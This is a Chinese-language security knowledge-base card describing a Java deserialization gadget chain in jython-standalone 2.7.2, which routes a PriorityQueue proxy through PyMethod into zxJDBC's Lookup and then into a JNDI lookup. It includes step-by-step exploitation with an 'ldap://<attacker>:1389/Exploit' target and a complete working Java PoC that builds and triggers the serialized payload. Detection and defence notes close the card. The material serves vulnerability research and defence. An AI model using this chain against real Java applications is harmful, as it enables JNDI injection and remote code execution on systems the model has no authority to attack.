---
id: web-java-deser-jython-pymethod-proxy-lookup-jndi
title: Jython 2.7.2 反序列化同一触发链的 JNDI 终端：PyMethod 代理 → com.ziclix.python.sql.connect.Lookup#__call__ 把首参传入 InitialContext.lookup
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jython-pymethod-invocationhandler-zxjdbc-lookup-jndi
tags:
- java
- deserialization
- jython
- pymethod
- zxjdbc
- jndi
- ldap
- priorityqueue
- dynamic-proxy
- gadget-chain
cve: []
severity: high
confidence: high
affected_versions: jython-standalone 2.7.2
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V539
  verified_at: '2026-11-11T18:51:55+08:00'
  notes: 已对照原文 content.md 与全部 14 张截图逐项核对（图 08-09）：Lookup.__call__ 中 Object jndiName=parser.arg(0).__tojava__(String.class)、new InitialContext(env)、context.lookup((String)jndiName)，PoC 中 queue=[PyString(ldap://127.0.0.1:1389),1]、im_class=new PyString().getType() 与原文一致；触发链与 eval 卡相同但终端 sink 不同（JNDI lookup），属独立终端场景、非重复，两卡已互链。dedup related 候选为其他 JNDI 入口，无同 CVE/同 sink。未验证点：原文只验证到 lookup 被调用（127.0.0.1:1389），下游远程类加载/本地工厂利用未在本篇打通；PoC 未复跑。
url: /docs/web/java/deserialization/jndi/web-java-deser-jython-pymethod-proxy-lookup-jndi/
draft: false
kb_aliases:
- Jython Lookup JNDI
- com.ziclix.python.sql.connect.Lookup
- zxJDBC Lookup 注入
- PyMethod 代理 JNDI
- jython-standalone 2.7.2 JNDI
---

## 一句话结论

与 Jython `BuiltinFunctions#eval` 相同的反序列化触发链（PriorityQueue 动态代理 comparator → `PyMethod.invoke` → `__func__.__call__`），把 `__func__` 换成 `com.ziclix.python.sql.connect.Lookup` 后，`Lookup.__call__` 会把第一个参数 `__tojava__(String.class)` 当作 JNDI 名并执行 `new InitialContext(env).lookup(jndiName)`，攻击者即可借序列化数据让目标发起任意 JNDI/LDAP/RMI 查询，进入 JNDI 注入链（原文为 jython-standalone 2.7.2 找到的第二处利用）。

## 原理

- **入口与转发链完全相同**：`PriorityQueue.readObject` → `heapify` → `siftDownUsingComparator` → `Comparator` 动态代理 `compare` → `PyMethod.invoke` → `PyMethod.__call__` → `instancemethod___call__` → `__func__.__call__`。`PyMethod` 实现 `InvocationHandler`，`__func__` 是可控的 `PyObject`。
- **Lookup 终端**：`com.ziclix.python.sql.connect.Lookup`（jython-standalone 内置 zxJDBC 模块）的 `__call__(PyObject[] args, String[] keywords)` 先 `Object jndiName = parser.arg(0).__tojava__(String.class);`，随后构造 `Hashtable env`、`InitialContext context = new InitialContext(env);`，最后 `ref = context.lookup((String) jndiName);`。JNDI 名来自 payload 第一个参数，无任何协议/主机白名单。
- **为什么能构成注入**：`InitialContext.lookup` 会按名字里的 scheme 连接外部 LDAP/RMI 服务并解析返回的 `Reference`；在允许 remote codebase 的 JDK（或存在本地 `ObjectFactory` gadget、配合高版本绕过）时可加载远程/本地工厂类执行代码。原文只验证到 `lookup("ldap://127.0.0.1:1389")` 被调用，下游利用取决于目标 JDK 与可用工厂。
- **checkSelf 约束**：与 eval 链一样，`im_class` 要满足 `PyArgs` 的类型检查；原文把 `pyMethod.im_class` 设为 `new PyString().getType()`，队列第一个元素为 `PyString("ldap://127.0.0.1:1389")`，第二个元素用 `1` 填充，`size=2` 即可在 heapify 时触发两次比较参数传入。
- **与 eval 终端的关系**：两条链共用同一 gadget 前半段，仅终端对象不同；当 `org.python.core.BuiltinFunctions` 被反序列化防火墙按类名拦截时，`com.ziclix.python.sql.connect.Lookup` 可作为替代终端。

## 触发条件

- 目标 classpath 存在 `jython-standalone` 2.7.2（含 `com.ziclix.python.sql.connect.Lookup`）。
- 应用存在 Java 原生反序列化入口，且未用 JEP 290 过滤器拦截 `org.python.*`/`com.ziclix.*`/`PriorityQueue` 组合。
- 目标主机可出网访问攻击者的 LDAP/RMI 服务（或可访问内网可用的恶意 JNDI 服务）。
- 下游命令执行依赖 JDK 版本与 JNDI 配置：低版本允许 remote codebase，或使用本地 ObjectFactory/高版本绕过链。

## 利用步骤

1. 用 `Unsafe.allocateInstance` 分配 `PyMethod`，设置 `__func__ = new com.ziclix.python.sql.connect.Lookup()`、`im_class = new PyString().getType()`。
2. `PriorityQueue` 的 `queue` 数组填 `[new PyString("ldap://<attacker>:1389/Exploit"), 1]`，`size` 设为 2，comparator 设为 `PyMethod` 作为 handler 的 `Comparator` 动态代理。
3. 序列化队列并投递到目标反序列化入口；`readObject` 时 heapify 触发 `compare`，经 PyMethod 转发进入 `Lookup.__call__`。
4. 目标执行 `InitialContext.lookup("ldap://<attacker>:1389/Exploit")`，连接攻击者 LDAP 服务并按其返回的 `Reference`/序列化数据继续利用（远程类加载、本地工厂 gadget 等，按目标 JDK 选择）。
5. 原文以 `ldap://127.0.0.1:1389` 验证 lookup 调用可达。

## PoC

```java
import org.python.core.PyMethod;
import org.python.core.PyString;
import sun.misc.Unsafe;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;

public class Lookup {
    public static void main(String[] args) throws Exception {
        Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) unsafeField.get(null);

        PyMethod pyMethod = (PyMethod) unsafe.allocateInstance(PyMethod.class);
        pyMethod.__func__ = new com.ziclix.python.sql.connect.Lookup();
        pyMethod.im_class = new PyString().getType();

        Comparator c = (Comparator) Proxy.newProxyInstance(
                Lookup.class.getClassLoader(),
                new Class[]{Comparator.class},
                pyMethod);

        PriorityQueue priorityQueue = new PriorityQueue(2, c);
        Object[] queue = new Object[]{
                new PyString("ldap://127.0.0.1:1389"),
                1
        };
        Field f = priorityQueue.getClass().getDeclaredField("queue");
        f.setAccessible(true);
        f.set(priorityQueue, queue);
        Field f2 = priorityQueue.getClass().getDeclaredField("size");
        f2.setAccessible(true);
        f2.set(priorityQueue, 2);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        new ObjectOutputStream(baos).writeObject(priorityQueue);
        new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray())).readObject();
    }
}
```

- 触发链：`ObjectInputStream.readObject → PriorityQueue.readObject → heapify → siftDownUsingComparator → $Proxy.compare → PyMethod.invoke → PyMethod.__call__ → instancemethod___call__ → PyObject.__call__ → com.ziclix.python.sql.connect.Lookup.__call__`。
- 原文字段值：`jndiName = "ldap://127.0.0.1:1389"`；实际利用把地址换成攻击者 LDAP/RMI 服务。

## 变体与关联

- 变体：同一触发链换成 `BuiltinFunctions`（index=18）直接执行 Python 代码，见关联卡 [[web-java-deser-jython-pymethod-proxy-builtin-eval]]。
- 变体：低版本 jython（<=2.5.2）用 `PyFunction` 代理 + `PyBytecode`，见关联卡 [[web-java-deser-jython-pyfunction-pybytecode]]。
- 关联：[[web-java-deserialization-jndi-low-version-rmi-ldap-remote-codebase]]（JNDI 低版本远程 codebase 的完整利用）；[[web-java-deserialization-jndi-high-version-beanfactory-el]]（高版本 JDK 本地工厂链）；[[web-java-deser-spring-aop-aspectjaroundadvice-priorityqueue-jndi]]（PriorityQueue 代理链打 JNDI 的另一实现）。

## 检测与防御

- 检测：反序列化数据中出现 `org.python.core.PyMethod`、`com.ziclix.python.sql.connect.Lookup`、`java.util.PriorityQueue` + 动态代理 comparator。
- 检测：应用进程发起非业务预期的 JNDI/LDAP/RMI 出站连接（尤其 1389/1099 端口）、`InitialContext.lookup` 相关堆栈与 zxJDBC 类加载。
- 防御：移除/升级 jython-standalone 2.7.2；对原生反序列化入口启用 JEP 290 `ObjectInputFilter`，拒绝 `org.python.*`、`com.ziclix.*` 与代理类。
- 防御：禁用 JNDI 远程 codebase（`com.sun.jndi.ldap.object.trustURLCodebase=false`、`com.sun.jndi.rmi.object.trustURLCodebase=false`），升级 JDK；对应用服务器出站 LDAP/RMI 做网络层限制。
